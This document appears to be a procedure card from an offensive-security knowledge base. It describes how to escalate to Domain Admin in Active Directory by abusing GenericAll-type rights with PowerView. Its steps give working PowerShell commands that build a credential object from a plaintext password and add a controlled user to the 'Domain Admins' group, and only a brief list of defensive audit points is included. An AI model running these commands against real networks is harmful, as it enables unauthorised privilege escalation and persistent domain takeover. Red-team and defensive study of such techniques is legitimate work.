---
id: bccbfd67-4fd2-4536-9418-ad65959bf3c4
name: add-user-to-domain-admin-group
type: procedure
verified: true
submitted: true
created_at: '2020-03-16T01:01:25.873472+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[Credential Access]]'
  - '[[Persistence]]'
techniques:
  - '[[Account Manipulation]]'
sub_techniques: []
tags:
  - active-directory
  - privileges
commands:
  - '[[commands/powershell-create-pscredential]]'
  - '[[commands/powerview-add-group-member]]'
tools:
  - '[[tools/PowerView]]'
platforms:
  - Windows
skill_level: advanced
impact_level: high
detection_risk: high
validated: true
---

# add-user-to-domain-admin-group

## Summary

Leverage permissions like GenericAll to add a controlled user to a privileged AD group such as Domain Admins using PowerView.

## Description

This procedure modifies group membership via PowerView's cmdlets, assuming the current user has sufficient rights from BloodHound-identified paths.

## Requirements

- PowerView imported ([[tools/PowerView]])
- Credentials with modify rights
- Target group name

## Defense

- Audit group membership changes (Event ID 4728)
- Use protected users group
- Least privilege for ACLs

## Objectives

1. Add user to privileged group
2. Gain elevated access
3. Verify membership

## Instructions

### Step 1: Import PowerView

**Context**: Load module on target shell.

Download and `. .\PowerView.ps1` in PowerShell.

> Ensure execution policy allows.

### Step 2: Create Credential Object

**Context**: If needed, create secure credential.

**Command** ([[commands/powershell-create-pscredential]]):
```powershell
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```

> For authenticated operations.

### Step 3: Add Group Member

**Context**: Execute add to target group.

**Command** ([[commands/powerview-add-group-member]]):
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members '$_CONTROLLED_USER' -Credential $Cred
```

> Adds without credential if current context suffices.

### Step 4: Verify

**Context**: Check membership.

`Get-DomainGroupMember 'Domain Admins'`.

> Confirm addition.

## Expected Output

Success message: Member added to group.
